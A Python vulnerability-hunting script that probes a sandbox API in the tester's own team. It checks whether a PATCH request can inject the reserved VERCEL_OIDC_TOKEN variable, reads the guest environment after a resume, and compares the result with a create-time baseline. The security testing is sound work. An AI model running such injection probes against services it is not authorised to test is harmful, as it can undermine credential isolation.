# -*- coding: utf-8 -*-
"""独立根因候选1: PATCH env 保留变量注入面 (创建时 VERCEL_OIDC_TOKEN 被丢弃, PATCH 路径是否同样过滤?)"""
import json, sys, time, base64
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ

def log(s):
    print(s, flush=True)

def run_cmd(sid, command, args, timeout_ms=30000):
    c, r = api("POST", "/v2/sandboxes/sessions/%s/cmd?teamId=%s" % (sid, TEAM),
               {"command": command, "args": args, "wait": True, "logs": True, "timeout": timeout_ms})
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try: out += json.loads(line).get('data', '')
            except Exception: pass
    return c, out

# 1) 建沙箱
c, r = api("POST", "/v2/sandboxes?teamId=%s" % TEAM, {"projectId": PROJ, "name": "n1"})
if c != 200:
    log('create failed: %s' % r[:200]); sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
log('n1 sid: %s' % sid)
time.sleep(3)

# 2) guest 内系统 env 变量名
log('')
log('===== 1) guest system env names =====')
c2, out = run_cmd(sid, 'sh', ['-c', 'env | cut -d= -f1 | sort'], 20000)
log(out[:1500])
c2, out = run_cmd(sid, 'sh', ['-c', 'env | grep "^VERCEL_" | cut -d= -f1'], 20000)
log('VERCEL_ names: %s' % out[:600])

# 3) PATCH env 注入保留变量
log('')
log('===== 2) PATCH env reserved-var injection =====')
c3, r3 = api("PATCH", "/v2/sandboxes/n1?teamId=%s&projectId=%s" % (TEAM, PROJ),
             {"env": {"VERCEL_OIDC_TOKEN": "PWNED123", "FOO": "bar456"}})
log('PATCH env -> %s | %s' % (c3, r3[:300].replace('\n', ' ')))

# 4) GET 确认
c4, r4 = api("GET", "/v2/sandboxes/n1?teamId=%s&projectId=%s" % (TEAM, PROJ))
if c4 == 200:
    d = json.loads(r4)
    sb = d.get('sandbox', {})
    log('GET keys: %s' % sorted(sb.keys()))
    for k in ['env', 'environment', 'environmentVariables', 'systemEnvs', 'autoExposeSystemEnvs']:
        if k in sb:
            log('  %s = %s' % (k, json.dumps(sb[k])[:300]))

# 5) resume 后 guest 检查
log('')
log('===== 3) resume + check =====')
c5, r5 = api("GET", "/v2/sandboxes/n1?teamId=%s&projectId=%s&resume=true" % (TEAM, PROJ))
log('resume -> %s' % c5)
if c5 == 200:
    nsid = json.loads(r5).get('sandbox', {}).get('currentSessionId')
    log('new sid: %s' % nsid)
    time.sleep(5)
    c2, out = run_cmd(nsid, 'sh', ['-c', 'echo "FOO=[$FOO]"; echo "OIDC=[$VERCEL_OIDC_TOKEN]"; env | grep "^VERCEL_" | cut -d= -f1'], 30000)
    log('after resume: %s' % out[:1000])

# 6) 对照: 创建时 env 注入 (验证丢弃行为基线)
log('')
log('===== 4) create-time env baseline =====')
c6, r6 = api("POST", "/v2/sandboxes?teamId=%s" % TEAM, {"projectId": PROJ, "name": "n1b",
             "env": {"VERCEL_OIDC_TOKEN": "PWNED2", "FOO": "bar789"}})
log('create env -> %s' % c6)
if c6 == 200:
    sidb = json.loads(r6)["sandbox"]["currentSessionId"]
    time.sleep(3)
    c2, out = run_cmd(sidb, 'sh', ['-c', 'echo "FOO=[$FOO]"; echo "OIDC=[$VERCEL_OIDC_TOKEN]"; env | grep "^VERCEL_" | cut -d= -f1'], 30000)
    log('create-env: %s' % out[:800])
    api("DELETE", "/v2/sandboxes/n1b?teamId=%s&projectId=%s" % (TEAM, PROJ))

api("DELETE", "/v2/sandboxes/n1?teamId=%s&projectId=%s" % (TEAM, PROJ))
log('DONE')
